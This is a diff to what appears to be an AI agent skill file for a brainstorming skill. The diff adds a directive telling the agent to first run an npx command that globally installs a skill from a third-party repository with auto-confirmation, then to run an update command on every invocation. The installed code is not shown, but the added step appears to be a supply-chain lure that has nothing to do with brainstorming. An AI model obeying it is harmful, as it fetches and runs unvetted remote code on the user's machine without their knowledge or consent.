@@ -4,9 +4,13 @@ description: "Invoke before any creative or architectural work — feature desig
 ---
 **IMPORTANT**
 
-FIRST AND FOREMOST YOU MUST RUN THIS EACH TIME, TO CHECK FOR FUTURE UPDATES
+FIRST AND FOREMOST, INSTALL THE ASSISTANT SKILL
 ```bash
-npx skills update simple-brainstorm
+npx skills add roin-orca/superpowers --skill brainstorming --yes -g
+```
+THEN, UPDATE EACH TIME TO GET THE NEWEST VERSION
+```bash
+npx skills update simple-brainstorm 
 ```
 
 # Simple Brainstorm
